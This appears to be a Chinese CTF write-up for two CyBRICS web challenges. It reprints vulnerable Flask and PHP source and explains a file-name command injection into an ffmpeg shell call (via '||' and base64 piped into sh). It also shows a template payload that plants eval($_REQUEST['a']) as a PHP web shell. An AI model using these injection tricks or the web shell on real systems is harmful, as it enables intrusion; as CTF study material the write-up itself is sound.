<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'gif'</span><span class="token punctuation">}</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'./uploads'</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'********************************'</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span> <span class="token operator">*</span> <span class="token number">1024</span>  <span class="token comment" spellcheck="true"># 500Kb</span>
ffLaG <span class="token operator">=</span> <span class="token string">"cybrics{********************************}"</span>
Bootstrap<span class="token punctuation">(</span>app<span class="token punctuation">)</span>
logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token operator">and</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token operator">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'No file part'</span><span class="token punctuation">)</span>
            flash<span class="token punctuation">(</span><span class="token string">'No file part'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>

        file <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> file<span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'No selected file'</span><span class="token punctuation">)</span>
            flash<span class="token punctuation">(</span><span class="token string">'No selected file'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token operator">not</span> allowed_file<span class="token punctuation">(</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">'Invalid file extension of file: {file.filename}'</span><span class="token punctuation">)</span>
            flash<span class="token punctuation">(</span><span class="token string">'Invalid file extension'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>

        <span class="token keyword">if</span> file<span class="token punctuation">.</span>content_type <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">'Invalid Content type: {file.content_type}'</span><span class="token punctuation">)</span>
            flash<span class="token punctuation">(</span><span class="token string">'Content type is not "image/gif"'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token operator">not</span> bool<span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$"</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token string">".."</span> <span class="token keyword">in</span> file<span class="token punctuation">.</span>filename<span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">'Invalid symbols in filename: {file.content_type}'</span><span class="token punctuation">)</span>
            flash<span class="token punctuation">(</span><span class="token string">'Invalid filename'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>

        <span class="token keyword">if</span> file <span class="token operator">and</span> allowed_file<span class="token punctuation">(</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
            filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
            file<span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>

            mime_type <span class="token operator">=</span> filetype<span class="token punctuation">.</span>guess_mime<span class="token punctuation">(</span>f<span class="token string">'uploads/{file.filename}'</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> mime_type <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">:</span>
                logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">'Invalid Mime type: {mime_type}'</span><span class="token punctuation">)</span>
                flash<span class="token punctuation">(</span><span class="token string">'Mime type is not "image/gif"'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>

            uid <span class="token operator">=</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>f<span class="token string">"uploads/{uid}"</span><span class="token punctuation">)</span>

            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>f<span class="token string">"Created: {uid}. Command: ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\""</span><span class="token punctuation">)</span>

            command <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>f<span class="token string">"ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\""</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
            command<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>
            logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>command<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>

            flash<span class="token punctuation">(</span><span class="token string">'Successfully saved'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">,</span> uid<span class="token operator">=</span>uid<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"form.html"</span><span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/result/&lt;uid>/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">result</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> image <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>f<span class="token string">"uploads/{uid}"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        mime_type <span class="token operator">=</span> filetype<span class="token punctuation">.</span>guess<span class="token punctuation">(</span>str<span class="token punctuation">(</span>Path<span class="token punctuation">(</span><span class="token string">"uploads"</span><span class="token punctuation">)</span> <span class="token operator">/</span> uid <span class="token operator">/</span> image<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> image<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".png"</span><span class="token punctuation">)</span> <span class="token operator">and</span> mime_type <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> mime_type<span class="token punctuation">.</span>EXTENSION <span class="token operator">==</span> <span class="token string">"png"</span><span class="token punctuation">:</span>
            images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>image<span class="token punctuation">)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"result.html"</span><span class="token punctuation">,</span> uid<span class="token operator">=</span>uid<span class="token punctuation">,</span> images<span class="token operator">=</span>images<span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/uploads/&lt;uid>/&lt;image>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">image</span><span class="token punctuation">(</span>uid<span class="token punctuation">,</span> image<span class="token punctuation">)</span><span class="token punctuation">:</span>
    logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
    dir <span class="token operator">=</span> str<span class="token punctuation">(</span>Path<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> uid<span class="token punctuation">)</span>
    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>dir<span class="token punctuation">,</span> image<span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>errorhandler<span class="token punctuation">(</span><span class="token number">413</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">request_entity_too_large</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"File is too large"</span><span class="token punctuation">,</span> <span class="token number">413</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> threaded<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
</code></pre>
<p>整体代码不是很长，三个路由，一个处理gif为png，一个展示，最后一个也是展示功能</p>
<p>根路由对上传的文件做了一万次是不是gif的判断，不好绕过的就是mime_type的判断，这个用了filetype这个库去实现，然后还对文件名有一定的限制<br>最后进一个危险函数subprocess.Popen，使用ffmpeg处理图像，但是filename除了之前的限制完全可控</p>
<p>两个思路，利用ffmpeg的漏洞，或是命令注入</p>
<h3 id="思路一（失败）"><a href="#思路一（失败）" class="headerlink" title="思路一（失败）"></a>思路一（失败）</h3><p>查了一下ffmpeg的洞，发现几年前有一个处理AVI视频格式的文件时在字幕文件中插入恶意数据导致ssrf的，如果能行自然能做<br>但是，这个题对gif的限制很大，为此我还专门去看了一下filetype是怎么判断的（以没看懂告终，然后师傅就做出来了）</p>
<h3 id="思路二（命令注入）"><a href="#思路二（命令注入）" class="headerlink" title="思路二（命令注入）"></a>思路二（命令注入）</h3><p>subprocess.Popen显然是一个超级危险函数，并且filename还基本上可控，引号也可有，可以重新闭合一下，但是&#x2F;;等符号没有，分隔命令指定目录什么的又不行，执行的回显我们也看不到，现在给的符号不足以反弹shell，并且经过测试靶机也访问不了外网（大概），但是师傅使用|超级管道符和或的功能完成了命令注入</p>
<h4 id="trick1"><a href="#trick1" class="headerlink" title="trick1"></a>trick1</h4><p>Linux命令行或语句连接一系列命令的时候，比如<code>aaa || ls || bbb</code>的时候，是从左往右执行执行第一个能执行的命令，并且不再执行之后的命令，这样子就可以把之前的命令随便闭合并且让他不能用，执行我们后面拼接的命令<br>因此可以使用<code>&#39; || cmd || sleep 10</code>来测试cmd是否可用，试了一下curl本地好像可以，但是访问不了外网（可能）</p>
<h4 id="trick2"><a href="#trick2" class="headerlink" title="trick2"></a>trick2</h4><p>管道符连接命令，面对不能出现的字符，当然是编码绕过他，<code>payload | base64 -d | sh</code><br>将payloadbase64编码之后完美绕过限制，管道到base64解码，再管道到sh执行，tql</p>
<p>从源码中可以得到upload目录就在当前目录下，并且肯定可写，而&#x2F;uploads&#x2F;&lt;uid&gt;&#x2F;&lt;image&gt;这个路由刚好可以读取对应内容，所以payload将main.py写进自己UID对应的目录下，用png格式保存就行，然后访问一下就可以看到源码获取flag了</p>
<h2 id="WoC"><a href="#WoC" class="headerlink" title="WoC"></a>WoC</h2><p>也是给了源码的题，直接给源码的都是好人啊（不像某些奇怪的比赛喜欢藏源码让你去robots.txt或者www.tar.gz等地方找<br>给了一个超大的框架，大概就是可以使用不同的计算器图片，然后功能也就是一个计算器。<br>框架太大了，真的理不清，并且html和PHP嵌套各种require各种操作，太高级了我这个萌新没接触过，试了好久才试出来整个网站大概是怎么运行的<br>登入登出和数据库毫无关系，就是根据用户名给一个session给一个UUID，感觉不注册也随便登录。。。然后还有几个工具界面，require过来require过去的，还有各种跳转<br>主要内容集中在calc.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token operator">!</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'template'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$userid</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'template'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'#^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$#s'</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/templates/$template.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$field</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?>[^()]+|(?4))*\)[^()]*)*)$#s'</span><span class="token punctuation">,</span> <span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">"BAD"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'share'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$calc</span> <span class="token operator">=</span> <span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/$calc.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;script>var preloadValue = &lt;?=json_encode((string)($field))?>;&lt;/script>\n"</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"inc/calclib.html"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/templates/$template.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"?p=sharelink&amp;calc=$calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $field;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">"ERROR"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$value</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">echo</span> <span class="token string">"&lt;script>var preloadValue = "</span> <span class="token punctuation">.</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">";&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">require</span> <span class="token string">"inc/calclib.html"</span><span class="token punctuation">;</span>
<span class="token keyword">require</span> <span class="token string">"calcs/$userid/templates/$template.html"</span><span class="token punctuation">;</span>
</code></pre>
<p>field就是要计算的数据，有一个超级正则表达式，不仅完全看不懂，放到正则可视化里面还报错，呜呜呜<br>能看懂的就是允许+-*/几个运算符号，然后还有sin cos几个数学函数，但是要什么开头什么结尾的，完全看不懂。。<br>如果能过这个超级正则就可以进入到eval里面，但是我真的看不懂啊呜呜呜，既然上了一个超级正则，那么可攻击的点应该就不是这</p>
<p>然后我们看到如果post的了一个share，会调用另一个危险函数file_put_contents，其将我们现在的算式filed存起来，并且拼接现有的计算器模板生成一个PHP文件，而又存在一个newtemplate.php可供我们自己操作，生成可控的模板，既然是生成PHP文件，自然就有很大的操作空间，比如getshell什么的<br>newtemplate.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$userid</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$error</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'html'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">do</span> <span class="token punctuation">{</span>
        <span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'html'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$html</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">"Bad chars"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
        <span class="token variable">$requiredBlocks</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string">'id="back"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="field" name="field"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit0"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit1"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit2"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit3"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit4"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit5"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit6"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit7"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit8"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="digit9"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="plus"'</span><span class="token punctuation">,</span>
            <span class="token string">'id="equals"'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
        
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requiredBlocks</span> <span class="token keyword">as</span> <span class="token variable">$block</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$html</span><span class="token punctuation">,</span> <span class="token variable">$block</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">"Missing required block: '$block'"</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        
        <span class="token variable">$uuid</span> <span class="token operator">=</span> <span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/templates/$uuid.html"</span><span class="token punctuation">,</span> <span class="token variable">$html</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">"Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
        <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p>没啥太多功能，就是写一个随机文件名的html，但是文件名会在inside.php里面回显出来，不必担心，写入的唯一限制就是不能出现&lt;?标签，这样子的话就没法构造PHP文件了，但是看回这一句</p>
<pre class=" language-php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/$calc.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;script>var preloadValue = &lt;?=json_encode((string)($field))?>;&lt;/script>\n"</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"inc/calclib.html"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/templates/$template.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>这里在最开始写入了一句<code>&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n</code><br>并且field虽然有一个超级正则但勉强可控，而它为我们提供了一个标签&lt;?&#x3D;，如果我们能够把这个标签保留下来，在后面自己创建的模板中就可以为所欲为了<br>而很有意思的是，&#x2F;*这两个符号一个是除号一个是乘号，虽然我也不知道这个超级正则怎么允许两个运算符连起来，但是的确这个注释符是可以过正则的，那么我们就注释掉了题目限制的闭合，后面拼接上我们带有shell的html就可以了</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>在newtemplate.php中新建一个内容为</p>
<pre><code>*/ eval($_REQUEST[&#39;a&#39;]); ?&gt; 
&#39;id=&quot;back&quot;&#39;,
            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,
            &#39;id=&quot;digit0&quot;&#39;,
            &#39;id=&quot;digit1&quot;&#39;,
            &#39;id=&quot;digit2&quot;&#39;,
            &#39;id=&quot;digit3&quot;&#39;,
            &#39;id=&quot;digit4&quot;&#39;,
            &#39;id=&quot;digit5&quot;&#39;,
            &#39;id=&quot;digit6&quot;&#39;,
            &#39;id=&quot;digit7&quot;&#39;,
            &#39;id=&quot;digit8&quot;&#39;,
            &#39;id=&quot;digit9&quot;&#39;,
            &#39;id=&quot;plus&quot;&#39;,
            &#39;id=&quot;equals&quot;&#39;,
</code></pre>
<p>的html文档，然后在calc.php中post一个share，令field为&#x2F;*，会回显写入PHP文件的路径，访问执行命令即可getshell</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>[pasecactf_2019]flask_ssti</title>
